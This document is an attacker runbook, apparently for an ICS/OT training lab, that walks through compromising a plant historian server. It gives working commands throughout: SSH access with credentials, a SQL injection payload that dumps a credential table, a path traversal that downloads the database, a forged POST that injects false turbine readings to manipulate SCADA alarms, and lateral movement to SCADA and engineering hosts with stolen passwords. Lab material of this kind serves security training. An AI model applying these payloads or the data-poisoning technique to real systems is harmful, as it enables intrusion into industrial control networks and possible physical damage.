# Runbook: uupl-historian

## Entry

SSH on port 22 as `hist_admin`. The password is the same as the database
password, which appears in at least four places across the lab. The most
direct route is via the engineering workstation's `Documents\engineering_notes.txt`
or `backups\PLC_Backup_2019.tar.gz`.

```
ssh hist_admin@10.10.2.10
```

Password: `Historian2015`.

The web interface on port 8080 has no authentication on read endpoints and is
reachable from any operational-zone host. SSH is the pivot path once credentials
are in hand.

## Identity and host reconnaissance

```powershell
PS C:\Users\hist_admin> whoami
```

Returns `ot.local\hist_admin`.

```powershell
PS C:\Users\hist_admin> hostname
```

Returns `HIST-SRV01`.

```powershell
PS C:\Users\hist_admin> ipconfig
```

Single NIC at `10.10.2.10`. Operational zone only. No direct control-zone path,
but the historian data comes from the engineering workstation's poll-and-ingest
cron, which talks to the PLC directly.

```powershell
PS C:\Users\hist_admin> netstat -ano
```

Port 8080 (Flask web interface) and port 22 (sshd) listening. The engineering
workstation's ingest cron connects and closes in under a second each minute, so
it is gone before a manual netstat lands.

## Configuration file

```powershell
PS C:\Users\hist_admin> cat C:\Historian\Config\historian.ini
```

One file, everything in it:

- Database path and credentials: `historian / Historian2015`
- Ingest credentials: `hist_read / history2017`
- SSH credentials: `hist_admin / Historian2015` (same as the database password,
  noted by the author as "easier to remember")
- Vulnerability annotations: the `/report` SQL injection is listed as
  `HEX-1847, closed won't-fix 2019`. The `/export` path traversal is
  `HEX-2291, never filed`.

```powershell
PS C:\Users\hist_admin> cat C:\Historian\Config\data_sources.xml
```

The RTU data source configuration. Lists every PLC feed: IP, port, tag names,
poll interval. Confirms `hex-turbine-plc` at `10.10.3.21:502` and the revenue
meter at `10.10.3.33:502`. Useful for understanding what the historian is
collecting and which PLCs are reachable from this zone.

## Database discovery

```powershell
PS C:\Users\hist_admin> cat C:\Historian\Data\README.txt
```

Documents the SQLite database location and notes the path traversal directly:
`http://10.10.2.10:8080/export?tag=../historian.db` serves the raw database
file. The README was written for the operator and doubles as an attacker guide.

```powershell
PS C:\Users\hist_admin> dir C:\Historian\Data\
```

The `historian.db` file. Size indicates how long the service has been running.
A fresh lab instance has a small seed file; a long-running instance accumulates
weeks of one-minute readings.

```powershell
PS C:\Users\hist_admin> dir C:\Historian\Archive\
```

```powershell
PS C:\Users\hist_admin> cat C:\Historian\Archive\export_schedule.txt
```

The nightly export schedule. Files are served via `/export?tag=<filename>`.
The traversal path (`tag=../historian.db`) is documented here as a note.

## Web interface

The web service runs on `http://10.10.2.10:8080/`. No authentication on read
endpoints.

```powershell
PS C:\Users\hist_admin> curl -s http://10.10.2.10:8080/status
```

Health check. Confirms the service is running.

```powershell
PS C:\Users\hist_admin> curl -s http://10.10.2.10:8080/assets
```

Returns the list of asset names the historian knows about: `turbine_rpm`,
`turbine_temperature`, `turbine_pressure`, `line_voltage_a`, `line_current_a`,
and so on. These are the tag names needed for `/report` queries.

```powershell
PS C:\Users\hist_admin> curl -s "http://10.10.2.10:8080/report?asset=turbine_rpm&from=2024-01-01&to=2099-01-01"
```

Returns CSV rows (timestamp,value,unit) within the historian's 30-day rolling
window. `2024-01-01` predates any lab start date. Useful for establishing the
baseline process state before injecting false readings.

### SQL injection

The `asset` parameter in `/report` passes unsanitised into the SQL query.
`HEX-1847`, closed as won't-fix in 2019.

```powershell
PS C:\Users\hist_admin> curl -s "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
```

Dumps the `config` table. Returns `db_user`, `db_pass`, `ssh_user`, `ssh_pass`,
`ingest_user`, `ingest_pass`. The SSH and ingest credentials appear here directly.

### Path traversal

The `tag` parameter in `/export` is not sanitised. `tag=../historian.db` serves
the raw SQLite database file. The `alarm_config` table holds trip thresholds for
each asset, the `config` table the full credential set, and the `readings` table
the process history.

Full exfil chain to unseen-gate: `books/operational-exfil.md`.

### Ingest poisoning

The `/ingest` endpoint accepts POST with `hist_read / history2017`.

```powershell
PS C:\Users\hist_admin> iwr -Uri http://10.10.2.10:8080/ingest -Method POST -ContentType "application/json" -Headers @{Authorization="Basic aGlzdF9yZWFkOmhpc3RvcnkyMDE3"} -Body '{"timestamp":"2026-05-01T00:00:00","asset":"turbine_rpm","value":0,"unit":"RPM"}'
```

Injects a false zero-RPM reading. The SCADA dashboard reads from the historian
and will reflect the injected value. Repeated injection can suppress or generate
alarms on the SCADA side depending on the threshold values in `alarm_config`.

## PSReadLine history

```powershell
PS C:\Users\hist_admin> cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Shows recent local queries: config file reads and historian web API calls
(`/report`, `/assets`, `/export`). Confirms what the administrator has been
looking at recently.

## Lateral movement

From the historian, the direct pivot is to the engineering workstation (which
has a path into the control zone) or to the SCADA server.

```
PS C:\Users\hist_admin> ssh engineer@10.10.2.30
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

*******************************************************************************
*                                                                             *
*   Unseen University Power & Light Co.                                       *
*   ENG-WS01, Engineering Workstation (Windows 10 Enterprise LTSC)          *
*                                                                             *
*   WARNING: This system has direct access to ICS/OT plant equipment.        *
*   Authorised engineers only. All activity is logged.                        *
*   Contact: Ponder Stibbons, ext 201 / ponder.stibbons@uupl.am             *
*                                                                             *
*******************************************************************************

PS C:\Users\engineer> exit
```

```
PS C:\Users\hist_admin> ssh scada_admin@10.10.2.20
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

*******************************************************************************
*                                                                             *
*   Unseen University Power & Light Co.                                       *
*   SCADA-SRV01, Distribution SCADA Server (Windows Server 2016)            *
*                                                                             *
*   Authorised UU P&L personnel only. Usage is monitored and logged.         *
*   Contact: Ponder Stibbons (ext 201) for access requests.                  *
*                                                                             *
*******************************************************************************

PS C:\Users\scada_admin> exit
```

Credentials for both were found in `historian.ini` (via the config table SQLi)
and in the engineering workstation notes: `engineer / spanner99` for the
engineering workstation and `scada_admin / W1nd0ws@2016` for the SCADA server.
The historian itself has no control-zone path, but the credentials it holds open
every other host in the operational zone.
